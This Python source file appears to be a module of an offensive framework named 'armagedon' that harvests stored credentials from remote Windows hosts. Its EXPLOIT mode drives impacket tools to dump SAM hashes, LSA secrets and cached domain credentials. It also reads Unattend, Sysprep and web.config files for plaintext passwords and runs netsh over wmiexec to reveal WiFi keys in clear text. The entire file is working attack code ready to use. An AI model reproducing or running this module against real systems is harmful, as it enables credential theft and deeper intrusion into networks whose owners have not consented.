"""Privilege Escalation — Stored Credentials Extraction.

Extracts credentials from common Windows storage locations:
- Registry (SAM, LSA secrets, Cached Credentials)
- Unattend/Sysprep files
- WiFi profiles
- Web credential vaults
- IIS configuration files
"""

import subprocess
import shutil
import logging

log = logging.getLogger("armagedon.modules.privesc.stored_creds")

NAME = "Stored Credentials Extraction"
DESCRIPTION = "Extract stored credentials from registry, config files, and vaults"
REQUIRED_PRIVS = []
PAYLOAD_DEFAULT = ""


def _extract_registry_creds(target: str, user: str, pwd: str, domain: str, timeout: int) -> dict:
    """Extract SAM, LSA secrets, and cached credentials."""
    result = {"sam": False, "lsa_secrets": False, "cached_creds": False, "data": []}
    cmd = shutil.which("impacket-secretsdump") or shutil.which("secretsdump.py")
    if not cmd or not user or not pwd:
        return result

    auth = f"{domain}/{user}:{pwd}" if domain else f"{user}:{pwd}"

    try:
        # Try dumping SAM hashes
        p = subprocess.run(
            [cmd, f"{auth}@{target}",
             "-sam", "SAM", "-system", "SYSTEM", "-lsadump", "-outputfile", "/tmp/sam_dump.txt"],
            capture_output=True, text=True, timeout=timeout * 3,
        )
        out = p.stdout + p.stderr

        if "Administrator:" in out or "SamSuccess" in out:
            result["sam"] = True
            result["data"].append("SAM hash dump successful")

        # Try LSA secrets
        p2 = subprocess.run(
            [cmd, f"{auth}@{target}", "-lsadump"],
            capture_output=True, text=True, timeout=timeout * 3,
        )
        out2 = p2.stdout + p2.stderr

        if "LSA" in out2 or "DefaultPassword" in out2:
            result["lsa_secrets"] = True
            result["data"].append("LSA secrets extracted")

        # Try cached domain credentials
        p3 = subprocess.run(
            [cmd, f"{auth}@{target}", "-cached"],
            capture_output=True, text=True, timeout=timeout * 3,
        )
        out3 = p3.stdout + p3.stderr

        if "cached" in out3.lower():
            result["cached_creds"] = True
            result["data"].append("Cached domain credentials found")

    except Exception as e:
        result["data"].append(f"Registry extraction error: {str(e)[:100]}")

    return result


def _extract_config_files(target: str, user: str, pwd: str, domain: str, timeout: int) -> dict:
    """Extract credentials from Unattend.xml, Sysprep, web.config."""
    result = {"files_found": [], "credentials": []}
    cmd = shutil.which("impacket-smbclient") or shutil.which("smbclient.py")
    if not cmd or not user or not pwd:
        return result

    auth = f"{domain}/{user}:{pwd}" if domain else f"{user}:{pwd}"

    # Common file paths that may contain credentials
    paths = [
        "C:\\Windows\\Panther\\Unattend.xml",
        "C:\\Windows\\Panther\\Unattend\\Unattend.xml",
        "C:\\Windows\\System32\\Sysprep\\Unattend.xml",
        "C:\\Windows\\System32\\Sysprep\\sysprep.xml",
        "C:\\inetpub\\wwwroot\\web.config",
        "C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config",
        "C:\\ProgramData\\Microsoft\\Wlansvc\\Profiles\\Interfaces\\*.xml",
    ]

    try:
        for path in paths[:3]:  # Check top 3 most promising
            p = subprocess.run(
                [cmd, f"{auth}@{target}", "-c", f'cat "{path}"'],
                capture_output=True, text=True, timeout=timeout,
            )
            out = p.stdout + p.stderr

            if "Password" in out or "credential" in out.lower():
                result["files_found"].append(path)
                # Extract passwords
                import re
                passwords = re.findall(r'<Password>([^<]+)</Password>', out)
                usernames = re.findall(r'<Username>([^<]+)</Username>', out)
                for i, pw in enumerate(passwords):
                    uname = usernames[i] if i < len(usernames) else "unknown"
                    result["credentials"].append({
                        "source": path,
                        "username": uname,
                        "password": pw,
                    })

    except Exception as e:
        result["data"] = f"Config extraction error: {str(e)[:100]}"

    return result


def _extract_wifi_creds(target: str, user: str, pwd: str, domain: str, timeout: int) -> dict:
    """Extract WiFi profile passwords."""
    result = {"profiles": [], "passwords": []}
    cmd = shutil.which("impacket-wmiexec") or shutil.which("wmiexec.py")
    if not cmd or not user or not pwd:
        return result

    auth = f"{domain}/{user}:{pwd}" if domain else f"{user}:{pwd}"

    try:
        # List WiFi profiles
        p = subprocess.run(
            [cmd, f"{auth}@{target}", "-q",
             'netsh wlan show profiles'],
            capture_output=True, text=True, timeout=timeout,
        )
        out = p.stdout
        profiles = [l.split(":")[-1].strip() for l in out.splitlines()
                   if "All User Profile" in l]

        for profile in profiles[:5]:
            p2 = subprocess.run(
                [cmd, f"{auth}@{target}", "-q",
                 f'netsh wlan show profile name="{profile}" key=clear'],
                capture_output=True, text=True, timeout=timeout,
            )
            out2 = p2.stdout
            if "Key Content" in out2:
                result["profiles"].append(profile)
                for line in out2.splitlines():
                    if "Key Content" in line:
                        result["passwords"].append({
                            "profile": profile,
                            "password": line.split(":")[-1].strip(),
                        })

    except Exception:
        pass

    return result


def check(options=None, target=None, **kwargs):
    """Check if stored credentials are accessible."""
    result = {"success": False, "data": {}, "error": None}
    smb_user = (options or {}).get("SMB_USER", "")
    smb_pass = (options or {}).get("SMB_PASS", "")
    smb_domain = (options or {}).get("SMB_DOMAIN", "")
    rhosts = target or (options or {}).get("RHOSTS", "")
    timeout = int((options or {}).get("TIMEOUT", 10))

    if not rhosts:
        result["error"] = "RHOSTS required"
        return result

    if not smb_user or not smb_pass:
        result["error"] = "SMB creds required"
        return result

    # Quick check: can we read SAM via SMB?
    cmd = shutil.which("impacket-smbclient") or shutil.which("smbclient.py")
    if cmd:
        auth = f"{smb_domain}/{smb_user}:{smb_pass}" if smb_domain else f"{smb_user}:{smb_pass}"
        try:
            p = subprocess.run(
                [cmd, f"{auth}@{target}", "-c", "ls C:\\Windows\\System32\\config\\SAM"],
                capture_output=True, text=True, timeout=timeout,
            )
            sam_accessible = "SAM" in (p.stdout + p.stderr)
            result["data"]["sam_accessible"] = sam_accessible
            result["success"] = True
        except Exception:
            result["success"] = True
            result["data"]["sam_accessible"] = False
    else:
        result["error"] = "impacket-smbclient not found"

    return result


def run(options=None, target=None, mode="CHECK", **kwargs):
    if options is None:
        options = {}
    rhosts = target or options.get("RHOSTS", "")
    timeout = int(options.get("TIMEOUT", 10))
    smb_user = options.get("SMB_USER", "")
    smb_pass = options.get("SMB_PASS", "")
    smb_domain = options.get("SMB_DOMAIN", "")

    log.info(f"Stored credentials run against {rhosts} mode={mode}")

    result = {
        "success": False,
        "technique": NAME,
        "target": rhosts,
        "mode": mode,
        "data": {},
        "error": None,
    }

    if not rhosts or not smb_user or not smb_pass:
        result["error"] = "RHOSTS, SMB_USER, SMB_PASS required"
        log.error(result["error"])
        return result

    if mode == "CHECK":
        check_result = check(options, target, **kwargs)
        result["data"] = check_result.get("data", {})
        result["success"] = check_result["success"]
        if check_result["data"].get("sam_accessible"):
            result["data"]["status"] = "SAM file accessible — stored credentials extractable"
        else:
            result["data"]["status"] = "SAM not directly accessible (need elevated privileges)"
        return result

    elif mode == "EXPLOIT":
        try:
            print(f"  [*] Extracting registry credentials...")
            reg_creds = _extract_registry_creds(rhosts, smb_user, smb_pass, smb_domain, timeout)

            print(f"  [*] Extracting config file credentials...")
            config_creds = _extract_config_files(rhosts, smb_user, smb_pass, smb_domain, timeout)

            print(f"  [*] Extracting WiFi credentials...")
            wifi_creds = _extract_wifi_creds(rhosts, smb_user, smb_pass, smb_domain, timeout)

            all_creds = reg_creds.get("data", []) + [
                f"{c['username']}:{c['password']} (from {c['source']})"
                for c in config_creds.get("credentials", [])
            ] + [
                f"WiFi:{c['profile']}:{c['password']}"
                for c in wifi_creds.get("passwords", [])
            ]

            result["success"] = True
            result["data"]["status"] = f"Extracted {len(all_creds)} credential(s)"
            result["data"]["sam_dumped"] = reg_creds.get("sam", False)
            result["data"]["lsa_extracted"] = reg_creds.get("lsa_secrets", False)
            result["data"]["cached_creds"] = reg_creds.get("cached_creds", False)
            result["data"]["config_files"] = config_creds.get("files_found", [])
            result["data"]["config_credentials"] = config_creds.get("credentials", [])
            result["data"]["wifi_profiles"] = wifi_creds.get("profiles", [])
            result["data"]["wifi_passwords"] = wifi_creds.get("passwords", [])
            result["data"]["all_credentials"] = all_creds

            print(f"  [+] SAM dumped: {reg_creds.get('sam', False)}")
            print(f"  [+] LSA secrets: {reg_creds.get('lsa_secrets', False)}")
            print(f"  [+] Config creds: {len(config_creds.get('credentials', []))}")
            print(f"  [+] WiFi creds: {len(wifi_creds.get('passwords', []))}")

        except Exception as e:
            result["error"] = str(e)

    return result
